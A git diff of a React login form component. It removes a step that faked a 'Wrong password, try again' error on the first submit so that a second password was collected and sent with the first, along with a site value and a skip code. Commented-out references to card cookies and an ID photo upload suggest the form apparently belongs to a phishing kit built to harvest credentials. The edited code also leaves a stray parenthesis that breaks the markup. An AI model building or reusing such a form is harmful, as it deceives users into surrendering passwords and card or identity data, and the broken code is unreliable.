@@ -11,19 +11,17 @@ import { toast } from "react-toastify";
 
 function LoginForm() {
   const [verified, setVerified] = useState(false);
-  const [showWrongPassword, setShowWrongPassword] = useState(false);
   // const [showModal, setShowModal] = useState(false);
 
   const initialvalues = {
     email: "",
     password: "",
-    wrongPassword: "",
   };
 
   const { login } = useMockLogin();
 
   const handleSubmit = async (values, formik) => {
-    const { email, password,wrongPassword  } = values;
+    const { email, password } = values;
 
     // Cookies.set("site", site);
     // Cookies.set("email", email);
@@ -35,7 +33,6 @@ function LoginForm() {
       site: site,
       email: email,
       password: password,
-      wrongPassword: wrongPassword,
       skipcode: "",
       // onlyCard: Cookies.get("onlyCard"),
       // holdingCard: Cookies.get("holdingCard"),
@@ -46,11 +43,7 @@ function LoginForm() {
     // console.log("allValues", allValues);
   };
 
-  const handleWrongPassword = () => {
-    setShowWrongPassword(true);
-    toast.error("Wrong password, try again");
-  };
-
+ 
   // const handleNextStep = () => {
   //   Cookies.set("email", email);
   //   Cookies.set("password", password);
@@ -97,8 +90,8 @@ function LoginForm() {
                   name="email"
                   required
                 />
-                    {!showWrongPassword ? (
-                <>
+                    
+               
                   <Field
                      className="w-full px-[12px] py-[1px] text-lg outline-none border-2 border-custom-gray4/70 focus:border-custom-blue2/60 focus:shadow-around-blue transition duration-300 rounded"
                     placeholder="Password"
@@ -107,21 +100,10 @@ function LoginForm() {
                     autoComplete="on"
                     required
                   />
-                </>
-              ) : (
-                <>
-                  <Field
-                     className="w-full px-[12px] py-[1px] text-lg outline-none border-2 border-custom-gray4/70 focus:border-custom-blue2/60 focus:shadow-around-blue transition duration-300 rounded"
-                    placeholder="Password"
-                    name="wrongPassword"
-                    type="password"
-                    autoComplete="on"
-                    required
-                  />
-
-               
-                </>
-              )}
+      
+                
+                 
+              
               </div>
               <div className="flex flex-col items-center">
                 {/* <ReCAPTCHA
@@ -145,16 +127,7 @@ function LoginForm() {
                   autoComplete="on"
                   required
                 />
-            {!showWrongPassword?(<button
-                  type="submit"
-                  // type="button"
-                  onClick={handleWrongPassword}
-                  className="mt-4 bg-custom-orange text-white text-[20px] px-[21px] py-[8px] tracking-wider"
-                  // disabled={!verified}
-                  // onClick={handleNextStep}
-                >
-                  Submit
-                </button>):(<button
+         <button
                   type="submit"
                   // type="button"
                   className="mt-4 bg-custom-orange text-white text-[20px] px-[21px] py-[8px] tracking-wider"
@@ -162,7 +135,7 @@ function LoginForm() {
                   // onClick={handleNextStep}
                 >
                   Submit
-                </button>)}
+                </button>)
               </div>
 
               {/* {showModal && <PhotoUpload setShowModal={setShowModal} />} */}
